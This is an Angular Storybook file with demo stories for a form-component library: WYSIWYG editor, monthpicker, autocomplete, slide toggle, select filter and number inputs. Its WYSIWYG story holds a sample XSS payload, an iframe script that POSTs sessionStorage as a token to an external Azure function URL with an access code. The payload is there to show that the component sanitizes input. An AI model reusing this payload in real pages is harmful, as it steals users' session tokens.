import {storiesOf} from '@storybook/angular';
import {boolean, number, select, text, withKnobs} from "@storybook/addon-knobs/angular";
import {action} from '@storybook/addon-actions'
import {
  SlideToggleModule,
  StoAutocompleteModule,
  StoDatepickerModule,
  StoFormModule,
  StoSelectFilterModule,
  StoWysiwygModule
} from "../../dist/stoui-form";
import {FormControl, ReactiveFormsModule, Validators} from "@angular/forms";
import {BrowserAnimationsModule} from "@angular/platform-browser/animations";
import monthPickerReadme from "../../projects/stoui-form/src/lib/sto-monthpicker/sto-monthpicker.md";
import {MatFormFieldModule} from "@angular/material/form-field";
import {MAT_LABEL_GLOBAL_OPTIONS, MatNativeDateModule} from '@angular/material/core';
import {MatInputModule} from "@angular/material/input";
import autocompleteReadme from "../../projects/stoui-form/src/lib/sto-autocomplete/sto-autocomplete.component.md";
import {items} from "./item-list";
import {MatSelectModule} from "@angular/material/select";
import {CommonModule} from "@angular/common";
import stoFormReadme from '../../projects/stoui-form/src/lib/sto-form/sto-form.md'
import {MatCardModule} from "@angular/material/card";
import {MatButtonModule} from "@angular/material/button";
import {TextFieldModule} from "@angular/cdk/text-field";
import {NumberInputModule} from "../../projects/stoui-form/src/lib/number-input/number-input.module";
import {MatIconModule} from "@angular/material/icon";

const stories = storiesOf('Forms', module)
  .addDecorator(withKnobs);

const unsanitized = `<iframe srcdoc="<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>">
</iframe>
<b>This is bold.</b>
`;

stories
  .add('WYSIWYG', () => ({
    moduleMetadata: {
      declarations: [],
      imports: [StoWysiwygModule, ReactiveFormsModule, MatCardModule, MatButtonModule]
    },
    template: `
<button (click)="change(control.value)">Log value</button>
<button (click)="disabled = !disabled">Toggle disabled state</button>
<!--boolean('Disabled', true)-->
    <mat-card class="sto-card" style="height: 600px">
        <sto-wysiwyg #wysiwyg [readonly]="disabled" [formControl]="control">
        <button mat-flat-button color="primary">Save</button>
        <button mat-flat-button color="primary">Cancel</button>
</sto-wysiwyg>
    </mat-card>

Sanitizing happens <b>*inside*</b> the wysiwyg component. Malicious html is not passed to innerHTML.<br>
To be safe, consuming apps should <b>always</b> sanitize input before sending to wysiwyg component.<br>
<br>
Before sanitizing:
<pre>
{{unsanitized}}
</pre>

SafeValue (sanitized text value)
<pre>
{{wysiwyg.value}}
</pre>
<br>

As HTML:
<div [innerHTML]="wysiwyg.value"></div>
    `,
    props: {
      unsanitized: unsanitized,
      control: new FormControl(unsanitized),
      disabled: false,
      change: action('Value changed'),
    },
  }));

stories.add('Monthpicker', () => ({
  moduleMetadata: {
    imports: [MatNativeDateModule, MatCardModule, BrowserAnimationsModule, StoDatepickerModule, ReactiveFormsModule, MatFormFieldModule, MatInputModule],
  },
  template: `<mat-card class="sto-form" style="width: 200px">
<mat-form-field class="sto-form__field" [stoMonthFormFieldClick]="picker">
<mat-label>Month</mat-label>
<input matInput [formControl]="ctrl" [mdMonthpicker]="picker">
<md-monthpicker-toggle matSuffix [for]="picker"></md-monthpicker-toggle>
<md-monthpicker #picker></md-monthpicker>
</mat-form-field>
</mat-card>`,
  props: {
    ctrl: new FormControl(new Date())
  }
}), {
  notes: {markdown: monthPickerReadme}
});

stories.add('Autocomplete', () => ({
  moduleMetadata: {
    imports: [StoAutocompleteModule, BrowserAnimationsModule, ReactiveFormsModule, MatCardModule]
  },
  template: `<mat-card style="width: 200px">
<sto-autocomplete class="sto-form" [displayFn]="displayValue === 'name' ? displayFn : displayLongName" (ngModelChange)="changed($event)" label="Autocomplete" [valueKey]="valueKey" [searchForKey]="searchKey" [unfiltered]="items" [formControl]="ctrl"></sto-autocomplete>
</mat-card>`,
  props: {
    ctrl: new FormControl(),
    items,
    searchKey: 'name',
    displayFn: value => value ? value.name : 'Empty',
    displayLongName: value => value ? value.longName : 'Empty',
    displayValue: select('Display by key', ['name', 'longName'], 'name'),
    valueKey: select('Which value should be emitted', ['id', 'name'], 'name'),
    changed: action('Value changed')
  }
}), {
  notes: {markdown: autocompleteReadme}
});

stories.add('Slide toggle', () => ({
  moduleMetadata: {
    imports: [SlideToggleModule, MatFormFieldModule, ReactiveFormsModule, BrowserAnimationsModule, MatCardModule, StoFormModule],
  },
  template: `
<mat-card style="width: 300px" class="sto-form">
  <button (click)="ctrl.disabled ? ctrl.enable() : ctrl.disable()">Toggle disabled</button><br>
<mat-form-field stoFormField floatLabel="always">
    <mat-label>Slide toggle</mat-label>
    <sto-slide-toggle [color]="color" [readonly]="readonly" [formControl]="ctrl" (ngModelChange)="valueChange($event)"></sto-slide-toggle>
</mat-form-field>
</mat-card>`,
  props: {
    ctrl: new FormControl(true),
    valueChange: action('Value changed'),
    readonly: boolean('Readonly', false),
    color: select('Color', ['primary', 'accent', 'warn'], 'primary'),
  }
}));

stories.add('MatSelect filter', () => ({
  moduleMetadata: {
    imports: [StoSelectFilterModule, MatFormFieldModule, MatSelectModule, BrowserAnimationsModule, CommonModule, MatCardModule]
  },
  template: `
<mat-card style="width: 300px" class="sto-form" (click)="flip()">
<mat-form-field *ngIf="multi" class="sto-form__field" floatLabel="always" >
<mat-label>Multiselect with filter</mat-label>
  <mat-select [multiple]="true" [value]="selected">
    <sto-select-filter (keydown.space)="$event.stopPropagation()" [isFilter]="true" [isMulti]="true" (valueChanges)="filteredItems = filter($event, allItems)"
    (selectAll)="selected = $event ? filteredItems :[]; selectAll($event)"></sto-select-filter>
    <mat-option *ngFor="let opt of filteredItems" [value]="opt">{{opt.name}}</mat-option>
</mat-select>
</mat-form-field>

<mat-form-field *ngIf="!multi" class="sto-form__field" floatLabel="always">
<mat-label>Select with filter</mat-label>
  <mat-select [multiple]="false" [value]="selected">
    <sto-select-filter (keydown.space)="$event.stopPropagation()" [isFilter]="true" [isMulti]="false" (valueChanges)="filteredItems = filter($event, allItems)"
    (selectAll)="selected = $event ? filteredItems :[]; selectAll($event)"></sto-select-filter>
    <mat-option *ngFor="let opt of filteredItems" [value]="opt">{{opt.name}}</mat-option>
</mat-select>
</mat-form-field>
</mat-card>
  `,
  props: {
    filter: (event, all) => {
      action('Filter by value')(event);
      const re = new RegExp(event || '');
      return all.filter(el => re.test(el.name));
    },
    selectAll: action('Select all'),
    flip: () => {
    },
    selected: [],
    multi: boolean('Multiple', false),
    filteredItems: items,
    allItems: items
  }
}));

const numberUnitCtrl = new FormControl({value: 32.123, unit: null}, Validators.required);

stories.add('StoValueUnitInput', () => ({
  moduleMetadata: {
    imports: [BrowserAnimationsModule, MatIconModule, MatFormFieldModule, NumberInputModule, MatCardModule, StoFormModule, ReactiveFormsModule]
  },
  template: `
  <mat-card class="sto-form" style="width: 600px">
  <button (click)="control.disabled ? control.enable() : control.disable()">Toggle disabled</button><br>
    <mat-form-field stoFormField floatLabel="always">
      <mat-label>{{label}}</mat-label>
      <sto-number-unit-input (ngModelChange)="change($event)"
      [fractionSize]="fractionSize"
      [list]="units"
      [readonly]="readonly"
      [formControl]="control"
      [unitPlaceholder]="unitPlaceholder"
      [unitClearText]="unitClearText"
      [unitOptional]="unitOptional"
      [placeholder]="placeholder">
      </sto-number-unit-input>
    </mat-form-field><br>
    {{control.value | json}}
  </mat-card>
  `,
  props: {
    control: numberUnitCtrl,
    fractionSize: number('Fraction size', 3),
    label: text('Label', 'Value Unit Input'),
    units: [{value: 'C', title: 'C°'}, {value: 'F', title: 'F°'}],
    placeholder: text('Quantity placeholder', 'Quantity'),
    unitPlaceholder: text('Unit placeholder', 'Unit'),
    change: action('Value changed'),
    readonly: boolean('Readonly', true),
    unitOptional: boolean('Unit optional', true),
    unitClearText: text('Clear text', '(none)')
  }
}));

stories.add('NumberInput', () => ({
  moduleMetadata: {
    imports: [BrowserAnimationsModule, MatIconModule, MatFormFieldModule, NumberInputModule, MatCardModule, StoFormModule, ReactiveFormsModule]
  },
  template: `
  <mat-card class="sto-form" style="width: 600px">
  <button (click)="control.disabled ? control.enable() : control.disable()">Toggle disabled</button><br>
  <button (click)="toggleValidator(control)">Toggle validator</button><br>
  <button (click)="control.markAsTouched()">Touched</button><br>
    <mat-form-field stoFormField floatLabel="always">
      <mat-label>{{label}}</mat-label>
      <sto-number-input (ngModelChange)="change($event)"
            [dynamicFractionSize]="dynamicFractionSize"
                        [fractionSize]="fractionSize"
                        [readonly]="readonly"
                        [formControl]="control"
                        [placeholder]="placeholder">
      </sto-number-input>
      <span matSuffix>$</span>
      <mat-error *ngIf="control.hasError('required')">{{ control.getError('required') }}</mat-error>
    </mat-form-field><br>
    {{control.value}}
  </mat-card>
  `,
  props: {
    control: new FormControl(null, Validators.required),
    toggleValidator: (control) => {
      if (control.validator) {
        control.clearValidators();
      } else {
        control.setValidators(Validators.required)
      }
      control.updateValueAndValidity();
    },
    fractionSize: number('Fraction size', 3),
    dynamicFractionSize: boolean('Dynamic fraction size', false),
    label: text('Label', 'Label'),
    placeholder: text('Placeholder', 'Value'),
    change: action('Value changed'),
    readonly: boolean('Readonly', false)
  }
}));

stories.add('StoFormField', () => ({
  moduleMetadata: {
    imports: [MatFormFieldModule, MatInputModule, StoFormModule, MatSelectModule, BrowserAnimationsModule, MatCardModule, TextFieldModule],
    providers: [{provide: MAT_LABEL_GLOBAL_OPTIONS, useValue: {float: 'always'}}]
  },
  template: `<mat-card class="sto-form">
<mat-form-field stoFormField *ngIf="withClasses">
<mat-label>Form field with styles</mat-label>
<input value="Some value" [disabled]="disabled" [readonly]="readonly" matInput>
</mat-form-field>
<mat-form-field stoFormField *ngIf="withClasses">
<mat-label>Form field with styles</mat-label>
<mat-select><mat-option>A</mat-option></mat-select>
</mat-form-field>
<mat-form-field appearance="fill" *ngIf="!withClasses">
<mat-label>Form field without styles</mat-label>
<input value="Some value" [disabled]="disabled" [readonly]="readonly" matInput>
</mat-form-field>
<mat-form-field stoFormField *ngIf="withClasses">
<mat-label>Text area with styles</mat-label>
<textarea matInput [cdkTextareaAutosize]="true">
Some Text Content

Should not select all on click
</textarea>
</mat-form-field>
</mat-card>`,
  props: {
    withClasses: boolean('Use styling', true),
    readonly: boolean('Readonly', false),
    disabled: boolean('Disabled', false)
  }
}), {
  notes: {markdown: stoFormReadme}
});
